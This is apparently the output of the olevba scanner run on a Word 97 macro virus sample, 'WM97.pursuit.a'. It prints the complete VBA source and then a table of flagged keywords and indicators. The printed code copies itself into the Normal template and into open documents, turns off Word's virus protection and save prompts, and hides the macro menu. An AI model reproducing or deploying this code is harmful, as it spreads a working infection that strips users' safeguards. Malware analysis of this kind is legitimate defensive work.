olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Persuit
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Persuit - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO pursuit.bas 
in file: ./Virus.MSWord.Persuit - OLE stream: 'Macros/VBA/pursuit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function pursuit()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents("pursuit").Export "C:\IE32.dll"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "pursuit" Then NormInfect = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "pursuit" Then docinfect = True
Next I
If NormInfect = False Then Set goinfect = NormalTemplate.VBProject
If docinfect = False Then Set goinfect = ActiveDocument.VBProject
goinfect.VBComponents.Import "C:\IE32.dll"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Function
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
Call payload
End Sub
Sub Autoclose()
On Error Resume Next
commandbars("tools").Controls("macro").Delete
Call pursuit
End Sub
Sub FileTemplates()
End Sub
Sub toolsmacro()
End Sub
Sub payload()
If Day(Now) = 5 Then
MsgBox "I'm in hot Pursuit", 0, "Psyclone X [PE]"
commandbars("Help").Controls("About Microsoft Word").Caption = "Pursuit By Psyclone X[PE]"
End If
End Sub
'''''''''''''''''''''''''''''''''''
'WM97.pursuit.a by Psyclone X [PE]'
'The Pencil Erasers:              '
'[SeZ] [Psyclone X] [RaTtRaP]     '
'''''''''''''''''''''''''''''''''''

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |IE32.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

